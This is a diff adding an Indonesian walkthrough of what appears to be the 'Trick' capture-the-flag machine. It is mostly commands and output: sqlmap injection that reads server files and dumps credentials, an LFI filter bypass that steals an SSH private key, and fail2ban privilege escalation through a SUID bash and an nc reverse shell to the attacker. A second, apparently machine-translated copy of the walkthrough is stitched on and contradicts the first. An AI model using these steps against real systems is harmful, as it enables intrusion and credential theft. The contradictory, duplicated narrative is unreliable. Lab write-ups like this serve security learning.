@@ -1,0 +1,280 @@
+#scan dengan nmap
+$ nmap -sV -p- -Pn -v 10.10.11.166
+
+-menunjukkan port 22, 25, 53, dan 80 terbuka
+#mencari directory dengan ffuf atau dengan gobuster
+$ ffuf -u http://trick.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+$ gobuster dir -u 10.10.11.166 -w /usr/share/wordlists/dirb/common.txt
+
+-menampilkan isi dari tiga direktori.
+
+assets
+css
+js
+index.html
+
+-tidak ada yang berharga disini
+
+#Melihat port 53 adalah opsi lain yang kami miliki. 
+#Kami dapat mencoba beberapa hal, tetapi yang terlintas dalam pikiran adalah mencoba Transfer Zona DNS. 
+#Ini akan memulai permintaan transfer zona AXFR.
+
+$ dig axfr trick.htb @trick.htb
+
+#Kami sekarang dapat menambahkan ini ke file /etc/hosts kami
+- 10.10.11.166  trick.htb
+- 10.10.11.166  preprod-payroll.trick.htb
+#Kita sekarang seharusnya dapat melihat situs web ini dengan menavigasi ke http://preprod-payroll.trick.htb.
+#Mengunjungi situs menampilkan login dan foto stok. Kami memiliki beberapa jalur untuk menghitung situs.
+
+
+# Kita bisa bermain dengan sqlmap dan setelah beberapa saat kita melihat bahwa kita bisa mendapatkan file dari mesin
+$ sqlmap --url "preprod-payroll.trick.htb/ajax.php?action=login" --data "username=test&password=test" --file-read "/etc/hostname" --batch
+<------------------------------------------------------------------------------------------------>
+[INFO] retrieved: 6
+[INFO] the local file '~/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_hostname' and the remote file '/etc/hostname' have the same size (6 B)
+files saved to [1]:
+<------------------------------------------------------------------------------------------------>
+$ cat ~/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_hostname
+trick
+
+
+# Karena kami tidak menemukan apa pun, kami akan mencari lebih banyak domain, untuk ini kami membuat kamus yang dimulai dengan "preprod-" dan menerapkan brute force
+
+$ sed 's/^/preprod-/' /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt > diccionario
+$ wfuzz -c -w ./diccionario -H "Host: FUZZ.trick.htb" -u 10.10.11.166 -t 100 --hl 83
+Target: http://10.10.11.166/
+Total requests: 4990
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000255:   200        178 L    631 W      9660 Ch     "preprod-marketing"
+
+#Sekarang di domain "preprod-marketing.trick.htb" kami menemukan beberapa bagian
+
+
+
+#Kita bisa memikirkan lfi tetapi memiliki perlindungan, dengan sqlmap kita dapat membaca index.php
+
+❯ sqlmap --url "preprod-payroll.trick.htb/ajax.php?action=login" --data "username=test&password=test" --file-read "/var/www/market/index.php" --batch
+<--------------------------------------------------------------------------------------------------->
+[INFO] retrieved: 194
+[INFO] the remote file '/var/www/market/index.php' is larger (194 B) than the local file '~/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php' (193B)
+files saved to [1]:
+<--------------------------------------------------------------------------------------------------->
+❯ cat ~/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php
+<?php
+$file = $_GET['page'];
+
+if(!isset($file) || ($file=="index.php")) {
+   include("/var/www/market/home.html");
+}
+else{
+        include("/var/www/market/".str_replace("../","",$file));
+}
+?>
+
+#Kami menemukan bahwa jika menemukan "../" itu menghapusnya, tetapi perlindungan ini dapat dengan mudah dilewati, ada contoh di repositori ini
+
+❯ curl "preprod-marketing.trick.htb/index.php?page=..././..././..././etc/passwd" | grep bash
+root:x:0:0:root:/root:/bin/bash
+michael:x:1001:1001::/home/michael:/bin/bash
+
+#Kami melihat bahwa pengguna michael ada, kami dapat melihat apakah dia memiliki id_rsa
+❯ curl "preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/id_rsa"
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+...
+...
+-----END OPENSSH PRIVATE KEY-----
+
+
+#Kami mendapatkan kunci resmi, kami dapat terhubung dan mendapatkan pengguna
+#kita simpan dengan nama id_rsa
+#beri izin agar tiak perlu memeasukkan password
+$ chmod 600 id_rsa
+#selanjutnya
+
+$ ssh michael@10.10.11.166 -i id_rsa
+michael@trick:~$ cat user.txt
+284cfd8cc39c95a6f8b33274c47a3214
+
+michael@trick:~$
+
+#Kami memiliki hak istimewa untuk memulai kembali layanan fail2ban sebagai root tanpa kata sandi
+
+michael@trick:~$ sudo -l
+Matching Defaults entries for michael on trick:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User michael may run the following commands on trick:
+    (root) NOPASSWD: /etc/init.d/fail2ban restart
+michael@trick:~$
+
+#Kami menemukan file konfigurasi fail2ban
+michael@trick:~$ cd /etc/fail2ban/action.d
+michael@trick:/etc/fail2ban/action.d$ cat iptables-multiport.conf
+#menampilkan
+# Fail2Ban configuration file
+#
+# Author: Cyril Jaquier
+# Modified by Yaroslav Halchenko for multiport banning
+#
+...
+..
+[INCLUDES]
+
+before = iptables-common.conf
+
+[Definition]
+
+[Init]
+
+#Kita bisa memodifikasi actionban, kita tidak bisa memodifikasinya tapi kita bisa menghapusnya dan membuat yang baru jadi kita akan melakukan hal berikut untuk memodifikasi "actionban"
+
+michael@trick:~$ sed "s/<iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>/chmod u+s \/bin\/bash/g" /etc/fail2ban/action.d/iptables-multiport.conf > config.conf
+michael@trick:~$ rm -f /etc/fail2ban/action.d/iptables-multiport.conf
+michael@trick:~$ mv config.conf /etc/fail2ban/action.d/iptables-multiport.conf
+michael@trick:~$
+
+# Kami akan memulai kembali layanan dan menerapkan kekerasan dengan hydra untuk memaksa larangan
+
+michael@trick:~$ sudo /etc/init.d/fail2ban restart
+[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
+michael@trick:~$
+
+#di terminal kita ketikkan 
+$ hydra 10.10.11.166 ssh -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://10.10.11.166:22/
+
+#Setelah 75 hingga 100 detik bash akan menjadi suid dan kita menjadi root
+
+michael@trick:~$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+michael@trick:~$ bash -p
+bash-5.0# whoami
+root
+bash-5.0# cat /root/root.txt
+6022eac530eb2608c484bae408b18dfe
+bash-5.0#
+
+#Menempelkan permintaan curl ke terminal dan kemudian mengubah curl ke sqlmap akan memungkinkan kita untuk melihat apakah ajax.php rentan terhadap SQL Injection.
+#maskkkan dulu user dan password sebagai admin
+#buka inspect element  lalu melihat tab Jaringan dan akhirnya mengirimkan upaya login akan memungkinkan kita untuk menyalin permintaan curl.
+
+$ curl 'http://preprod-payroll.trick.htb/ajax.php?action=login'   -H 'Connection: keep-alive'   -H 'Accept: */*'   -H 'X-Requested-With: XMLHttpRequest'   -H 'User-Agent: Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'   -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'   -H 'Origin: http://preprod-payroll.trick.htb'   -H 'Referer: http://preprod-payroll.trick.htb/login.php'   -H 'Accept-Language: en-US,en;q=0.9,id;q=0.8'   -H 'Cookie: PHPSESSID=tqcae0uitsiraa289ajkas74go'   --data-raw 'username=admin&password=admin'
+
+# bisa hapus --compressed dan --insecure
+
+#kemudian  kita cek dengan sqlmap apakah ada kerentanan sql
+
+$ sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login'   -H 'Connection: keep-alive'   -H 'Accept: */*'   -H 'X-Requested-With: XMLHttpRequest'   -H 'User-Agent: Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'   -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'   -H 'Origin: http://preprod-payroll.trick.htb'   -H 'Referer: http://preprod-payroll.trick.htb/login.php'   -H 'Accept-Language: en-US,en;q=0.9,id;q=0.8'   -H 'Cookie: PHPSESSID=tqcae0uitsiraa289ajkas74go'   --data-raw 'username=admin&password=admin'   --compressed
+
+# bisa hapus --compressed dan --insecure
+
+#Menjalankan perintah ini memang menunjukkan bahwa aplikasi tersebut rentan terhadap SQL Injection
+
+# Dari sini kita dapat mulai menghitung untuk database dengan menjalankan perintah yang sama dan pada akhirnya kita menambahkan –dbs.
+
+$ sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login'   -H 'Connection: keep-alive'   -H 'Accept: */*'   -H 'X-Requested-With: XMLHttpRequest'   -H 'User-Agent: Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'   -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'   -H 'Origin: http://preprod-payroll.trick.htb'   -H 'Referer: http://preprod-payroll.trick.htb/login.php'   -H 'Accept-Language: en-US,en;q=0.9,id;q=0.8'   -H 'Cookie: PHPSESSID=tqcae0uitsiraa289ajkas74go'   --data-raw 'username=admin&password=admin'   --compressed -dbs
+
+# Sekarang kita memiliki database, kita bisa mulai dari tabel. Database payroll_db adalah target kami.
+
+
+$ sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login'   -H 'Connection: keep-alive'   -H 'Accept: */*'   -H 'X-Requested-With: XMLHttpRequest'   -H 'User-Agent: Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'   -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'   -H 'Origin: http://preprod-payroll.trick.htb'   -H 'Referer: http://preprod-payroll.trick.htb/login.php'   -H 'Accept-Language: en-US,en;q=0.9,id;q=0.8'   -H 'Cookie: PHPSESSID=tqcae0uitsiraa289ajkas74go'   --data-raw 'username=admin&password=admin'   --compressed -D payroll_db –tables
+
+#kita telah memiliki tabel,kita akan dump semuanya.Karena kami ingin mengautentikasi, kami harus menyerang tabel pengguna.
+
+
+$ sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login'   -H 'Connection: keep-alive'   -H 'Accept: */*'   -H 'X-Requested-With: XMLHttpRequest'   -H 'User-Agent: Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'   -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'   -H 'Origin: http://preprod-payroll.trick.htb'   -H 'Referer: http://preprod-payroll.trick.htb/login.php'   -H 'Accept-Language: en-US,en;q=0.9,id;q=0.8'   -H 'Cookie: PHPSESSID=tqcae0uitsiraa289ajkas74go'   --data-raw 'username=admin&password=admin'   --compressed -D payroll_db -T users –dump
+
+
+#Kami sekarang memiliki pengguna! Kita dapat mencoba dan masuk dan melihat apa yang ada di aplikasi ini. Masuk menampilkan beberapa daftar untuk manajemen.
+- username : Enemigosss
+- password : SuperGucciRainbowCake
+BhMnjBYkEdMNxwXwcocZ!
+
+
+
+# Kita dapat menggunakan ffuf untuk brute force untuk menemukannya, jika ada. 
+#Mari kita ubah file DNS SecLists dan tambahkan preprod- ke setiap elemen dan simpan. 
+#Saya menggunakan Sublime Text untuk melakukan ini dan menggunakan subdomain SecList-top1million-5000.txt
+
+$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000-trick.txt -u http://trick.htb -H “Host: FUZZ.trick.htb”
+
+# Jika kita menambahkan -fs 5480 ke perintah ini, ini akan menyaring respons yang panjangnya 5480 byte dan kita dapat menunjukkan dengan tepat apa temuan yang sebenarnya. Menambahkan filter mengungkapkan subdomain baru yang disebut preprod-marketing.
+
+# Menambahkan ini ke /etc/hosts sekarang seharusnya memungkinkan kita untuk melihat situs web baru.
+
+- 10.10.11.166  trick.htb
+- 10.10.11.166  preprod-payroll.trick.htb
+- 10.10.11.166  preprod-marketing.trick.htb
+
+#Mari kita lihat apakah kita dapat membaca file /etc/passwd.
+
+http://preprod-marketing.trick.htb/index.php?page=…/./…/./…/./…/./…/./etc/passwd
+
+#tidak menampilkan file passwd.
+
+# Melihat pengguna Micheal dalam file ini, dan direktori home dan bahwa mereka dapat ssh ke server, dapat menyarankan pengguna memiliki kunci id_rsa. Kita dapat mencoba dan mengaksesnya.
+http://preprod-marketing.trick.htb/index.php?page=…/./…/./…/./…/./…/./home/michael/.ssh/
+
+tidak menampilkan kunci pribadi pengguna. Menyimpan kunci ini akan memungkinkan kita untuk ssh sebagai Michael.
+
+
+
+Dengan kunci ini dan menerapkan izin file yang benar ( chmod 400 {apa pun yang Anda beri nama kunci} ) kita harus dapat ssh masuk.
+
+
+
+Sekarang kita masuk, bendera pengguna harus ada di sini.
+
+
+
+Kita harus melakukan sedikit enumerasi pengguna untuk melihat apa yang dapat dilakukan Michael dengan sudo, grup apa yang ada di Michael, id, grup, dll.
+
+
+
+Di sini kita dapat melihat jalan ke depan untuk eskalasi hak istimewa. Michael dapat menggunakan /etc/init.d/fail2ban restart.
+
+Saya memanfaatkan artikel ini oleh Youssef Ichioui untuk menyalahgunakan fungsi ini dan menjadi root. Saya akan meringkas artikel untuk posting ini, tetapi saya mendorong Anda untuk memeriksa artikel lengkapnya.
+
+Penting untuk mencatat izin file untuk action.d/. Karena Michael ada di grup keamanan, kami dapat memindahkan file dari direktori home kami ke direktori dan menimpanya.
+
+
+
+Artikel oleh Youssef Ichioui menyarankan agar kita menyalin file iptables-multiport.conf ke direktori home kita dan memodifikasinya.
+
+
+
+Di sini kita dapat menambahkan perintah ke parameter actionban untuk membuat koneksi kembali ke kotak serangan kita. Perintahnya adalah /usr/bin/nc {your ip} {port yang Anda gunakan} -e /usr/bin/bash .
+
+
+
+Sekarang kita perlu menyimpan file dan memindahkannya ke /etc/fail2ban/action.d/ dan memasukkan y ketika diminta untuk menimpa file. Kita dapat memeriksa ulang apakah perubahan telah diterapkan dengan menggunakan perintah tail dan membaca output dari file.
+
+
+
+Dengan perintah kami di tempat, kami dapat memulai pendengar di kotak serangan kami.
+
+
+
+Kita sekarang dapat me-restart /etc/init.d/fail2ban dengan menggunakan perintah
+
+sudo /etc/init.d/fail2ban restart
+
+
+
+Kembali ke kotak serangan kami, kami dapat gagal ke SSH beberapa kali untuk memicu autoban dan menjalankan shell terbalik kami dengan menggunakan pengguna acak dan kata sandi yang jelas buruk.
+
+
+
+Kembali pada pendengar kami, kami dapat melihat bahwa kami memiliki koneksi dan kami adalah root!
+
+
+
+Itu melengkapi ruangan! Bagus sekali! Jika Anda merasa ini bermanfaat, kirimkan saya tweet dan beri tahu saya pendapat Anda! Umpan balik selalu dihargai!
